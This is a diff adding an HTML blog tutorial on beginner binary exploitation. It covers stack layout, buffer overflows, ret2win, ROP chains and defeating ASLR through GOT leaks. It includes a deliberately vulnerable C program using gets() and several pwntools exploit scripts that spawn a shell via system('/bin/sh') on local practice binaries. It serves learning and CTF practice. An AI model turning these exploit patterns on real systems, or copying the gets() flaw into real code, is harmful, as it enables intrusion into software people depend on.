@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MEMORY-EXPLOITATION-INTRO(1)</title>
+    <link rel="stylesheet" href="../styles.css">
+        <!-- Highlight.js CSS -->
+    <link rel="stylesheet" href="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/styles/default.min.css" />
+</head>
+<body>
+
+<div class="header">
+    <h1>MEMORY-EXPLOITATION-INTRO(1)</h1>
+    <nav><a href="../index.html">home</a> <a href="../blog.html">posts</a></nav>
+</div>
+
+<div class="article-header">
+    <div class="article-meta">2024-02-13 | Binary Exploitation | 20 min read</div>
+    <h1 class="article-title">Memory Exploitation for Absolute Beginners</h1>
+</div>
+
+<h2>SYNOPSIS</h2>
+<p>
+A comprehensive introduction to memory exploitation covering the fundamentals of how programs work in memory, common vulnerabilities, and basic exploitation techniques. Perfect for those starting their journey in binary exploitation.
+</p>
+
+<h2>DESCRIPTION</h2>
+<p>
+Look, I'm not gonna lie to you. Memory exploitation seems scary at first. When I started learning this stuff, I felt completely overwhelmed. Terms like "stack", "heap", "buffer overflow" were just gibberish to me. But here's the thing - once you understand the basics, it all clicks together like puzzle pieces.
+</p>
+
+<p>
+So let's forget the fancy jargon for a minute and talk about what's actually happening when you run a program on your computer. I promise by the end of this, you'll have a solid grasp of how memory works and why exploiting it is even possible.
+</p>
+
+<h3>What Actually Happens When You Run a Program</h3>
+<p>
+When you double-click that executable or type a command in your terminal, your operating system does something pretty cool. It creates a process and gives it a chunk of memory to work with. Think of this memory as the program's personal workspace where it can store data, instructions, and everything it needs to function.
+</p>
+
+<p>
+This memory isn't just one big blob though. It's organized into different sections, each with a specific purpose. The main ones you need to know about are:
+</p>
+
+<p>
+The <strong>Stack</strong> - This is where local variables live. Every time you call a function, the program creates a new "frame" on the stack with all that function's local variables and some bookkeeping information. When the function returns, that frame gets popped off. It's literally a last-in-first-out structure, just like a stack of plates.
+</p>
+
+<p>
+The <strong>Heap</strong> - This is for dynamic memory allocation. When you call malloc() in C or new in C++, you're requesting memory from the heap. Unlike the stack, you control when this memory gets allocated and freed.
+</p>
+
+<p>
+The <strong>Data Section</strong> - Global and static variables hang out here. This section is divided into initialized data (.data) and uninitialized data (.bss).
+</p>
+
+<p>
+The <strong>Text Section</strong> - This is where your actual program instructions live. The CPU reads from here to know what to do next.
+</p>
+
+<h3>The Stack - Your New Best Friend</h3>
+<p>
+Most beginner exploits focus on the stack, so let's really dig into how it works. I'm gonna show you some code and we'll trace through exactly what happens in memory.
+</p>
+
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+void vulnerable_function() {
+    char buffer[64];
+    gets(buffer);
+    printf("You entered: %s\n", buffer);
+}
+
+int main() {
+    printf("Welcome to the program\n");
+    vulnerable_function();
+    printf("Program finished\n");
+    return 0;
+}</code></pre>
+
+<p>
+Okay, so what's happening here? When main() calls vulnerable_function(), the stack grows. The program pushes the return address (where to jump back to after the function finishes) onto the stack, along with some other bookkeeping stuff. Then it allocates space for that 64-byte buffer.
+</p>
+
+<p>
+Here's what the stack looks like in a simplified view:
+</p>
+
+<pre><code>High Memory Addresses
++------------------+
+| ...              |
++------------------+
+| Return Address   | <-- Where to go after vulnerable_function()
++------------------+
+| Saved RBP        | <-- Previous stack frame pointer
++------------------+
+| buffer[63]       |
+| buffer[62]       |
+| ...              |
+| buffer[1]        |
+| buffer[0]        | <-- Our 64-byte buffer
++------------------+
+Low Memory Addresses</code></pre>
+
+<p>
+Now here's where it gets interesting. That gets() function? It's dangerous as hell. It reads input until it sees a newline, with absolutely no regard for how much space you actually have. So if I type more than 64 characters, where does that extra data go?
+</p>
+
+<p>
+It keeps writing up the stack. It'll overwrite the saved base pointer, then the return address, and keep going if you give it enough input. This is called a buffer overflow, and it's the foundation of stack-based exploitation.
+</p>
+
+<h3>Why This Matters - The Return Address</h3>
+<p>
+Think about what happens when vulnerable_function() finishes executing. The program needs to know where to go next, right? It looks at that saved return address on the stack and jumps there. But what if we overwrote that return address with our own value?
+</p>
+
+<p>
+The program would jump to wherever we tell it to. That's basically how exploitation works. We hijack the control flow of the program by corrupting the return address.
+</p>
+
+<p>
+Let me show you a simple exploit to make this concrete:
+</p>
+
+<pre><code class="language-python">from pwn import *
+
+# Our vulnerable program
+elf = ELF('./vulnerable')
+p = process('./vulnerable')
+
+# We need to figure out the offset to the return address
+# Usually this is buffer size + saved RBP (8 bytes on 64-bit)
+offset = 64 + 8
+
+# Let's say we want to jump to address 0x401234
+target_address = 0x401234
+
+# Build our payload
+payload = b'A' * offset          # Fill the buffer and saved RBP
+payload += p64(target_address)   # Overwrite return address
+
+# Send it
+p.sendline(payload)
+p.interactive()</code></pre>
+
+<p>
+This payload fills the buffer with 'A's, overwrites the saved base pointer, and then puts our target address where the return address should be. When vulnerable_function() returns, boom - we're executing at 0x401234 instead of back in main().
+</p>
+
+<h3>But Wait, There's a Problem</h3>
+<p>
+Now you might be thinking "okay cool, but what do I even jump to?" And that's a great question. In the old days, you could put your own machine code instructions (called shellcode) right there in the buffer and jump to it. You'd overflow the buffer with your shellcode, then set the return address to point back to your buffer.
+</p>
+
+<p>
+But modern systems have protections against this. The main one is called NX (No eXecute) or DEP (Data Execution Prevention). It marks the stack as non-executable, so even if you put shellcode there and jump to it, the program will crash.
+</p>
+
+<p>
+So how do we get around this? Well, we use code that's already in the program. This is where techniques like Return-Oriented Programming (ROP) come in, but let's start simpler with something called ret2win.
+</p>
+
+<h3>The ret2win Pattern</h3>
+<p>
+Imagine the vulnerable program has a function like this that's never normally called:
+</p>
+
+<pre><code class="language-c">void win() {
+    system("/bin/sh");
+}</code></pre>
+
+<p>
+This function exists in the binary, so its code is in the executable memory section. If we can overwrite the return address to point to win(), we get a shell. Simple as that.
+</p>
+
+<pre><code class="language-python">from pwn import *
+
+elf = ELF('./ret2win_challenge')
+p = process('./ret2win_challenge')
+
+# Find the address of the win function
+win_addr = elf.symbols['win']
+print(f"Win function at: {hex(win_addr)}")
+
+# Build payload
+offset = 72  # Let's say we determined this is the offset
+payload = b'A' * offset
+payload += p64(win_addr)
+
+# Send and get shell
+p.sendline(payload)
+p.interactive()</code></pre>
+
+<p>
+This is your first real exploit pattern. You're not injecting code, you're just redirecting execution to code that already exists. This is way more powerful than it might seem at first.
+</p>
+
+<h3>Finding the Offset - The Detective Work</h3>
+<p>
+One thing I glossed over is figuring out that offset value. How do you know how many bytes to send before you hit the return address? There's a technique using cyclic patterns that makes this super easy.
+</p>
+
+<pre><code class="language-python">from pwn import *
+
+# Generate a unique cyclic pattern
+pattern = cyclic(200)
+print(pattern)
+
+# Run the program and send the pattern
+p = process('./vulnerable')
+p.sendline(pattern)
+p.wait()
+
+# Check what value ended up in RIP (instruction pointer)
+# Let's say it crashed and RIP was 0x6161616161616166
+# We can find the offset like this:
+offset = cyclic_find(0x6161616161616166)
+print(f"Offset is: {offset}")</code></pre>
+
+<p>
+The cyclic pattern creates a unique sequence where every 4-byte (or 8-byte) chunk is different. When the program crashes, you look at what value ended up in the instruction pointer register, find where that value appears in your pattern, and that's your offset.
+</p>
+
+<h3>Registers - The CPU's Scratch Pad</h3>
+<p>
+Before we go further, you need to understand registers. These are super fast storage locations right in the CPU. On x86-64 systems (which is probably what you're using), the important ones are:
+</p>
+
+<p>
+<strong>RAX</strong> - Usually holds return values from functions<br>
+<strong>RBX, RCX, RDX</strong> - General purpose registers<br>
+<strong>RSI, RDI</strong> - Often used for function arguments (RDI is first arg, RSI is second)<br>
+<strong>RBP</strong> - Base pointer, points to the base of the current stack frame<br>
+<strong>RSP</strong> - Stack pointer, points to the top of the stack<br>
+<strong>RIP</strong> - Instruction pointer, points to the next instruction to execute
+</p>
+
+<p>
+When you overflow a buffer and overwrite the return address, you're ultimately controlling RIP. That's the holy grail - controlling RIP means you control where the program executes.
+</p>
+
+<h3>Return-Oriented Programming (ROP) - Using What's There</h3>
+<p>
+Alright, now we're getting to the good stuff. ROP is how you do complex things even with NX enabled. The idea is simple but brilliant: instead of injecting your own code, you chain together small pieces of existing code called "gadgets".
+</p>
+
+<p>
+A gadget is just a few instructions ending with a 'ret' instruction. Something like:
+</p>
+
+<pre><code>pop rdi
+ret</code></pre>
+
+<p>
+This gadget pops a value from the stack into the RDI register, then returns. Why is this useful? Because RDI holds the first argument to a function in the x86-64 calling convention.
+</p>
+
+<p>
+Let's say you want to call system("/bin/sh"). You need to:
+1. Get the address of "/bin/sh" into RDI
+2. Jump to system()
+</p>
+
+<p>
+Here's how you do it with ROP:
+</p>
+
+<pre><code class="language-python">from pwn import *
+
+elf = ELF('./vulnerable')
+p = process('./vulnerable')
+
+# Find gadgets (you'd use ROPgadget or ropper tool)
+pop_rdi = 0x4011bb  # Address of "pop rdi; ret" gadget
+
+# Find addresses we need
+system_addr = elf.plt['system']
+binsh_addr = next(elf.search(b'/bin/sh\x00'))
+
+# Build the ROP chain
+offset = 72
+payload = b'A' * offset
+payload += p64(pop_rdi)        # Execute pop rdi; ret
+payload += p64(binsh_addr)     # This gets popped into RDI
+payload += p64(system_addr)    # Jump to system("/bin/sh")
+
+p.sendline(payload)
+p.interactive()</code></pre>
+
+<p>
+Let me break down what happens when this executes:
+1. The return happens from our vulnerable function
+2. It "returns" to our pop_rdi gadget
+3. That gadget pops the next value (binsh_addr) into RDI
+4. Then it executes ret, which pops the next value (system_addr) into RIP
+5. Now we're executing system() with "/bin/sh" as the argument
+</p>
+
+<p>
+This is the core of ROP. You're building a chain of gadgets that together do what you want.
+</p>
+
+<h3>The PLT and GOT - Dynamic Linking Magic</h3>
+<p>
+You might be wondering about that elf.plt['system'] thing. What's PLT? And you'll hear about GOT too. These are super important for exploitation.
+</p>
+
+<p>
+Most programs don't include the entire libc library in the binary. Instead, they dynamically link to it at runtime. The PLT (Procedure Linkage Table) and GOT (Global Offset Table) are how this works.
+</p>
+
+<p>
+When you call a library function like system(), you're actually calling a stub in the PLT. The first time it's called, the PLT stub figures out where system() actually is in memory (remember ASLR randomizes this) and writes that address to the GOT. Subsequent calls just jump directly to the address in the GOT.
+</p>
+
+<p>
+This is huge for exploitation because:
+1. You can call PLT entries even with ASLR (they're at fixed offsets in the binary)
+2. You can leak addresses from the GOT to defeat ASLR
+3. You can sometimes overwrite GOT entries to hijack function calls
+</p>
+
+<h3>Leaking Addresses - Defeating ASLR</h3>
+<p>
+ASLR randomizes where things are loaded in memory, but here's the thing - it doesn't change the relative offsets between functions in the same library. If you can leak the address of one function, you can calculate where all the others are.
+</p>
+
+<p>
+Here's a common pattern:
+</p>
+
+<pre><code class="language-python">from pwn import *
+
+elf = ELF('./vulnerable')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+p = process('./vulnerable')
+
+# Stage 1: Leak puts address
+pop_rdi = 0x4011bb
+payload = b'A' * 72
+payload += p64(pop_rdi)
+payload += p64(elf.got['puts'])    # Argument to puts
+payload += p64(elf.plt['puts'])    # Call puts(got['puts'])
+payload += p64(elf.symbols['main']) # Return to main to exploit again
+
+p.sendline(payload)
+p.recvline()  # Skip any output
+leaked_puts = u64(p.recv(6).ljust(8, b'\x00'))
+log.info(f"Leaked puts: {hex(leaked_puts)}")
+
+# Calculate libc base
+libc_base = leaked_puts - libc.symbols['puts']
+log.info(f"Libc base: {hex(libc_base)}")
+
+# Now we know where everything in libc is
+system_addr = libc_base + libc.symbols['system']
+binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
+
+# Stage 2: Execute system("/bin/sh")
+payload = b'A' * 72
+payload += p64(pop_rdi)
+payload += p64(binsh_addr)
+payload += p64(system_addr)
+
+p.sendline(payload)
+p.interactive()</code></pre>
+
+<p>
+This is a two-stage exploit. First, we leak an address from libc by calling puts() to print out its own GOT entry. Then we use that leaked address to calculate where system() and "/bin/sh" are, and call them in the second stage.
+</p>
+
+<h3>Common Mistakes and How to Avoid Them</h3>
+<p>
+I've made every mistake in the book, so let me save you some time:
+</p>
+
+<p>
+<strong>Stack Alignment</strong> - On x86-64, the stack needs to be 16-byte aligned when you call functions. If your exploit crashes when calling system() but you know the address is right, try adding an extra 'ret' gadget before your ROP chain to align the stack.
+</p>
+
+<pre><code class="language-python">ret_gadget = 0x40101a  # Just a "ret" instruction
+payload += p64(ret_gadget)  # Add this for alignment
+payload += p64(pop_rdi)
+payload += p64(binsh_addr)
+payload += p64(system_addr)</code></pre>
+
+<p>
+<strong>Null Bytes</strong> - Addresses often contain null bytes (0x00). Functions like gets() and strcpy() stop at null bytes, so your payload gets cut off. You need to structure your exploit to avoid nulls in the middle of the payload, or use different input methods.
+</p>
+
+<p>
+<strong>PIE (Position Independent Executable)</strong> - If PIE is enabled, even the binary's code is randomized. You'll need to leak an address from the binary first before you can use gadgets. Look for functions that print addresses or use format string bugs.
+</p>
+
+<h3>Tools You Need</h3>
+<p>
+Get familiar with these tools, they'll be your daily drivers:
+</p>
+
+<p>
+<strong>pwntools</strong> - Python library for writing exploits. Makes everything so much easier.<br>
+<strong>gdb with pwndbg/gef</strong> - Debugger with plugins for exploit development. Essential for understanding what's happening.<br>
+<strong>ROPgadget or ropper</strong> - Find gadgets in binaries automatically.<br>
+<strong>objdump</strong> - Disassemble binaries to understand the code.<br>
+<strong>checksec</strong> - Check what security features are enabled on a binary.
+</p>
+
+<h2>EXAMPLES</h2>
+<p>
+Here's a complete example pulling everything together. We have a binary with a buffer overflow, ASLR is enabled, NX is enabled, but PIE is disabled:
+</p>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+# Configuration
+elf = ELF('./challenge')
+libc = ELF('./libc.so.6')
+context.binary = elf
+context.log_level = 'debug'
+
+def exploit():
+    # Start the process
+    p = process('./challenge')
+    
+    # Find gadgets
+    pop_rdi = 0x00000000004011d3  # pop rdi; ret
+    ret = 0x000000000040101a       # ret (for alignment)
+    
+    # Stage 1: Leak libc address
+    log.info("Stage 1: Leaking libc address")
+    
+    offset = 88  # Determined via cyclic pattern
+    payload = flat([
+        b'A' * offset,
+        pop_rdi,
+        elf.got['puts'],
+        elf.plt['puts'],
+        elf.symbols['main']  # Loop back
+    ])
+    
+    p.sendlineafter(b'Input: ', payload)
+    p.recvline()
+    
+    # Parse the leak
+    leak = u64(p.recvline().strip().ljust(8, b'\x00'))
+    log.success(f"Leaked puts@libc: {hex(leak)}")
+    
+    # Calculate libc base
+    libc.address = leak - libc.symbols['puts']
+    log.success(f"Libc base: {hex(libc.address)}")
+    
+    # Stage 2: Execute shell
+    log.info("Stage 2: Getting shell")
+    
+    payload = flat([
+        b'A' * offset,
+        ret,  # Stack alignment
+        pop_rdi,
+        next(libc.search(b'/bin/sh\x00')),
+        libc.symbols['system']
+    ])
+    
+    p.sendlineafter(b'Input: ', payload)
+    p.interactive()
+
+if __name__ == '__main__':
+    exploit()</code></pre>
+
+<h2>NOTES</h2>
+<p>
+Memory exploitation is a skill that takes time to develop. Don't get discouraged if things don't click immediately. Here are some final tips:
+</p>
+
+<p>
+Start with challenges that have minimal protections. Work your way up gradually. Try platforms like pwnable.kr, pwnable.tw, or CTF challenges on CTFtime.
+</p>
+
+<p>
+Always run checksec on a binary before you start. It tells you what protections are enabled and helps you plan your approach.
+</p>
+
+<p>
+Use a debugger. Seriously. Set breakpoints, examine registers, watch the stack. Understanding what's happening at each step is crucial.
+</p>
+
+<p>
+Read other people's writeups. The exploitation community is great at sharing knowledge. When you solve a challenge, read how others did it too. You'll learn new techniques and perspectives.
+</p>
+
+<p>
+Remember that this knowledge comes with responsibility. Only practice on systems you own or have explicit permission to test. There are plenty of legal practice grounds - you don't need to do anything shady to learn.
+</p>
+
+<p>
+The rabbit hole goes deep. After you're comfortable with basic stack overflows, explore heap exploitation, format string bugs, race conditions, and more advanced ROP techniques. But master the basics first.
+</p>
+
+<h2>SEE ALSO</h2>
+<p>
+pwnable.kr - Great beginner-friendly challenges<br>
+exploit.education - Excellent progressive learning path<br>
+LiveOverflow YouTube channel - Amazing video tutorials<br>
+pwntools documentation - Your exploitation framework reference<br>
+The Shellcoder's Handbook - Classic book on the subject
+</p>
+
+<div class="footer">
+    <p><a href="../blog.html">back to posts</a></p>
+</div>
+
+
+<!-- Highlight.js JS -->
+<script src="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/highlight.min.js"></script>
+
+<!-- Language Support -->
+<script src="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/languages/cpp.min.js"></script>
+<script src="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/languages/c.min.js"></script>
+<script src="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/languages/python.min.js"></script>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach((block) => {
+        hljs.highlightElement(block);
+    });
+});
+</script>
+
+</body>
+</html>
